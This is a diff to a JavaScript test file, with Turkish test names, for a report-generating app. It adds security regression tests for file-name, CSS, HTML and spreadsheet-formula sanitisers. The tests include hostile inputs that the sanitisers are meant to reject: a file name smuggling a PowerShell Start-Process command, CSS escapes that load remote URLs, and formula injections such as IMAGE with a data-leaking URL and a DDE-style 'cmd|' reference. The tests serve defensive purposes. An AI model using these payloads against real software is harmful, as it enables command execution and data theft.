@@ -429,7 +429,9 @@ test('Electron: render-pdf JS kapalı, ağ engelli, güvenilir göndericili; pre
   const main = fs.readFileSync(path.join(ROOT, 'electron', 'main.js'), 'utf8');
   const handler = main.slice(main.indexOf("ipcMain.handle('buyerlog:render-pdf'"), main.indexOf("ipcMain.handle('buyerlog:render-pdf'") + 700);
   assert.match(handler, /trustedBuyerLogIpcSender\(event\)/);
-  const render = main.slice(main.indexOf('async function renderAiPdf'), main.indexOf('function trustedBuyerLogIpcSender'));
+  const render = main.slice(main.indexOf('const AI_PDF_PARTITION'), main.indexOf('function trustedBuyerLogIpcSender'));
+  assert.match(render, /const AI_PDF_PARTITION = 'buyerlog-ai-pdf';/, 'tek bellek içi oturum (sızıntı yok)');
+  assert.match(render, /aiPdfQueue/, 'basımlar sıralı');
   assert.match(render, /javascript: false/);
   assert.match(render, /sandbox: true/);
   assert.match(render, /nodeIntegration: false/);
@@ -462,4 +464,76 @@ test('arayüz: yanıt biçimi seçici, dosya kartı (Aç/Klasörde Göster), ham
     assert.ok(assistant.includes(`${code}: { tr:`), code);
     assert.ok(require('../server/lib/lcwai/lcwai-errors').CODES[code.replace('LCWAI_', '')], code);
   }
+});
+
+/* ---------------- İnceleme bulguları (regresyon) ---------------- */
+test('güvenlik: AI başlığından gelen dosya adı kabuk/joker karakteri taşımaz; PowerShell tipografik tırnağı da kaçışlar', () => {
+  assert.equal(safeFileBase("Rapor’; Start-Process calc; ’"), 'Rapor Start-Process calc');
+  assert.equal(safeFileBase('LCW AI’ın Q3’s [a] $x `y` & %z%'), 'LCW AIın Q3s a x y z');
+  const platform = require('../server/lib/platform');
+  if (platform.IS_WINDOWS) {
+    const plan = platform.externalOpenPlan("C:\\x\\a’b'c.pdf");
+    assert.match(plan.args.at(-1), /a’’b''c\.pdf'$/);
+  }
+  const source = fs.readFileSync(path.join(ROOT, 'server', 'lib', 'platform.js'), 'utf8');
+  assert.match(source, /replace\(\/\['\\u2018-\\u201B\]\/g, quote => quote \+ quote\)/);
+});
+
+test('güvenlik: CSS kaçışı ve image-set ile uzak kaynak sızmaz; tırnaksız öznitelikteki / atılır', () => {
+  assert.equal(html.safeCss('background:\\75 rl(https://e/x)'), null);
+  assert.equal(html.safeCss('background:image-set("https://e" 1x)'), null);
+  assert.equal(html.safeCss('width:40%;color:#fff'), 'width:40%;color:#fff');
+  const sheet = html.sanitizeStyleSheet('.a{color:red;background:\\75rl(https://e/x)} @\\69mport "https://e/c.css"; .b{background:-webkit-image-set("https://e" 1x)}');
+  assert.doesNotMatch(sheet, /https?:|\\|import/);
+  assert.match(sheet, /\.a\{color:red;/);
+  assert.equal(html.sanitizeHtml('<svg><rect height=10/></svg>').body, '<svg><rect height="10"></rect></svg>');
+});
+
+test('XLSX formülleri izin listesiyle doğrulanır; ";" ayırıcı, uzak veri ve dış başvuru düşer; sayfa adı ≤ 31', () => {
+  assert.equal(contracts.safeFormula('=SUM(B2:B10)'), 'SUM(B2:B10)');
+  assert.equal(contracts.safeFormula('IF(A1>0,"a;b",0)'), 'IF(A1>0,"a;b",0)');
+  for (const bad of ['SUM(B2;B10)', 'IMAGE("https://x/?d="&A2)', 'WEBSERVICE("x")', '[Book]S!A1', 'cmd|x!A1', 'SUM((1)', 'STOCKHISTORY("X")']) assert.equal(contracts.safeFormula(bad), null, bad);
+  const long = 'Çok Uzun Bir Sayfa Adı Örneği 2026';
+  const workbook = contracts.normalizeWorkbook({ title: 't', sheets: Array.from({ length: 10 }, () => ({ name: long, columns: ['a'], rows: [[1]] })).concat([{ name: 'History', columns: ['a'], rows: [[1]] }]) }).data;
+  const names = XLSX.read(renderWorkbook(workbook), { type: 'buffer' }).SheetNames;
+  assert.ok(names.every(name => name.length <= 31), names.join('|'));
+  assert.equal(new Set(names.map(name => name.toLowerCase())).size, names.length);
+  assert.ok(!names.includes('History'));
+});
+
+test('istem kırpılırken kullanıcı isteği korunur (kırpılan bağlamdır)', () => {
+  const prompts = require('../server/lib/lcwai/lcwai-prompt');
+  const huge = { label: 'CP', screen: 'cp', columns: ['A'], rows: Array.from({ length: 400 }, (_, i) => [`${'x'.repeat(180)}${i}`]), totalRows: 400 };
+  const built = prompts.buildChatPrompt({ message: 'KULLANICI-ISTEGI sonuna kadar', contexts: [huge, huge, huge, huge], lang: 'tr' });
+  assert.ok(built.prompt.endsWith('KULLANICI-ISTEGI sonuna kadar'));
+  assert.ok(built.prompt.length <= require('../server/lib/lcwai/lcwai-config').LIMITS.maxPromptChars);
+});
+
+test('AI Outputs: bozuk metadata ezilmeden yedeklenir', () => {
+  const dir = tempDir();
+  const store = createOutputStore({ root: path.join(dir, 'ai-outputs') });
+  fs.writeFileSync(store.indexFile(), '{bozuk');
+  store.save('u1', { buffer: Buffer.from('a'), title: 'x', format: 'html' });
+  assert.ok(fs.readdirSync(dir).some(name => name.startsWith('ai-outputs-index.json.corrupt-')));
+  assert.equal(store.list('u1').length, 1);
+});
+
+test('dinamik tasarım: HTML’de yalnız-CSS animasyonlar (azaltılmış harekete ve baskıya saygılı), PPTX geçiş + renk geçişi, XLSX veri çubuğu', () => {
+  const screen = theme.reportCss({ print: false });
+  assert.match(screen, /@media screen and \(prefers-reduced-motion:no-preference\)\{/);
+  for (const name of ['bl-rise', 'bl-pop', 'bl-grow', 'bl-ring', 'bl-shift']) assert.match(screen, new RegExp(`@keyframes ${name}\\{`));
+  assert.match(screen, /@media print\{[^]*animation:none !important/);
+  assert.doesNotMatch(theme.reportCss({ print: true }), /prefers-reduced-motion/, 'PDF’de animasyon yok');
+  for (const cls of ['bl-ring', 'bl-timeline', 'bl-steps', 'bl-progress', 'bl-trend']) assert.match(screen, new RegExp(`\\.${cls}\\b`));
+  assert.match(contracts.buildInstruction({ format: 'html', template: templates.TEMPLATES.general, lang: 'tr' }), /bl-rings[^]*JavaScript asla/);
+  const deck = contracts.normalizePresentation({ title: 'T', slides: [{ layout: 'section', title: 'S' }, { layout: 'bullets', title: 'B', bullets: ['x'] }] }).data;
+  const files = unzip(renderPresentation(deck));
+  assert.match(files['ppt/slides/slide1.xml'], /<a:gradFill rotWithShape="1">/);
+  assert.match(files['ppt/slides/slide2.xml'], /<p:transition spd="slow"><p:push dir="u"\/><\/p:transition><\/p:sld>$/);
+  assert.match(files['ppt/slides/slide3.xml'], /<p:transition spd="med"><p:fade\/><\/p:transition><\/p:sld>$/);
+  assert.match(files['ppt/slides/slide1.xml'], /<a:alpha val="9000"\/>/);
+  const book = unzip(renderWorkbook(contracts.normalizeWorkbook({ title: 't', sheets: [{ name: 'S', columns: [{ header: 'A', type: 'text' }, { header: 'N', type: 'integer' }], rows: [['a', 1], ['b', 2]] }] }).data));
+  assert.match(book['xl/worksheets/sheet1.xml'], /<cfRule type="dataBar" priority="2">/);
+  assert.match(book['xl/worksheets/sheet1.xml'], /<conditionalFormatting sqref="B2:B3">/);
+  assert.match(book['xl/styles.xml'], /<dxfs count="1">/);
 });
